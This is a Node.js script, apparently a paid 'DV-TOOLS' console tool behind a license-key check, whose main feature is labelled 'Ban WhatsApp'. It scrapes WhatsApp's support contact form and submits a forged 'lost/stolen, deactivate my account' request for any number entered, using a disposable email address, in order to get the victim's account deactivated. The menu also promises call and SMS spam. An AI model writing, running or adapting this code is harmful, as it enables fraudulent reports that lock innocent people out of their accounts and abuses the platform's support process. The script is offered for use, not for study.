const { exec } = require('child_process')
const axios = require('axios').default
const cheerio = require('cheerio')
const util = require('util')
const fs = require('fs')
const readline = require('readline')
const rl = readline.createInterface({input: process.stdin,output: process.stdout});

const keyfile = fs.readFileSync('./license.txt');
axios.get(`https://rasitechchannel.my.id/token1/token.txt`).then(res => {
const key = res.data;

const login = () => {
return new Promise((resolve) => {
rl.question("License Key: ", token => {
if (token == key) {
fs.writeFile('./license.txt', key, function (err) {
if (err) throw err;})
menu();
} else {
console.log("\x1b[41m", 'Wrong Key!, Please Contact wa.me/6285866295942', '\x1b[0m')
exec(`xdg-open https://wa.me/6285866295942?text=buy+license+key+[dv-tools]`, (error, stdout, stderr) => {});
setTimeout (() => {console.clear();login()},5000);}})});}

const menu = () => {
return new Promise((resolve) => {
console.clear()
rl.question("---===(DV-TOOLS)===---\n\n[1].Start Script\n\n[2].Update Script\n\n[3].Join Grup\n\n[4].Exit\n\nChoose (1-4)\n>", menua => {
if (menua == 1) {
start();
} else if (menua == 2){ 
exec(`git remote set-url origin https://github.com/dcode-denpa/dv-tools.git && git pull`, (error, stdout, stderr) => {console.log(stdout)});
setTimeout (() => {resolve(menu());},15000);
} else if (menua == 3){ 
exec(`xdg-open https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`, (error, stdout, stderr) => {});
setTimeout (() => {console.clear();menu()},5000);
} else if (menua == 4){ 
rl.close();
} else {
console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
setTimeout (() => {resolve(menu());},5000);}});});};

const start = () => {
return new Promise((resolve) => {
console.clear()
rl.question("---===(LIST-MENU)===---\n\n[1].Ban WhatsApp\n\n[2].Spam Call {soon}\n\n[3].Spam Sms {soon}\n\n[4].Back\n\n[5].Exit\n\nChoose (1-5)\n>", starta => {
if (starta == 1) {
banwa();
} else if (starta == 4){ 
menu();
} else if (starta == 5){ 
rl.close();
} else {
console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
setTimeout (() => {resolve(start());},5000);}});});};

const banwa = () => {
return new Promise((resolve) => {
console.clear()
rl.question("Enter Number (+62xxx): ", async (nomor) => {
var nom = nomor
if (!nom.startsWith("+")) nom = "+"+nomor
var finding = await (await require ("awesome-phonenumber")(nom)).g
var ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
var email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", finding.regionCode)
form.append("phone_number", finding.number.international)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var res = await axios({url,method: "POST",data: form,headers: {cookie}})
if (res.data.includes("true")) {
console.log("\x1b[32m",`Success Banned: ${nom}\n\nResults: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`.replace("Perdido/roubado: desative minha conta", "CENSORED").replace(email.data[0], "CENSORED").replace(email.data[0], "CENSORED"),'\x1b[0m')
rl.question("Success Banned, Want to Retry? (y/n): ", async (banwaa) => {
if (banwaa == 'y') {
banwa();
} else if (banwaa== 'n'){ 
start();
} else {
banwa();}})
} else {
console.log("\x1b[41m", 'Error: Please try another Number!', '\x1b[0m')
setTimeout (() => {banwa();},5000);}});});};

rl.on('close', () => {
console.log("\x1b[44m", 'Closed, Have a Great day!', '\x1b[0m');
process.exit(0);});

console.clear()
keyfile
if (keyfile == key){
exec(`xdg-open https://youtube.com/@dcodedenpa`, (error, stdout, stderr) => {});
setTimeout (() => {menu();},5000);
} else if (keyfile == !key){
login();
} else {
console.log("\x1b[41m", 'License Key has been Changed by Developer!', '\x1b[0m')
exec(`xdg-open https://wa.me/6285866295942?text=give+new+license+key+[dv-tools]`, (error, stdout, stderr) => {});
setTimeout (() => {login();},5000)};})